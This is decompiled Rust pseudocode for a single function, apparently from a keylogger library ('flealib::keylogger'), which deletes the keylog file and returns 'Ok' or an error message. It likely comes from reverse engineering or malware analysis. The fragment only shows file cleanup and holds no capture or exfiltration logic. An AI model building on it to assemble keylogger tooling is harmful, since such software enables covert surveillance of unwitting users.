
  fn flealib::keylogger::remove_keylog_file::hb8183b71da054a05(arg1: *mut i128, arg2: *mut c_void) -> *mut i128

{
    let mut rax: i64;
    let mut rdx: i64;
    rax = std::fs::remove_file::h9b9ca484ce24f094(arg2);
    
    if rax == 0
    {
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h76be6af41d2a4859(arg1, 
            "Ok%Y-%m-%d %H:%M:%S[]\nFailed to…", 2);
        return arg1;
    }
    
    let mut var_10: i64 = rax;
    _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h00281d94234d25d8(arg1, 
        &var_10, rdx);
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h96b79424257da29d(&var_10);
    arg1
}
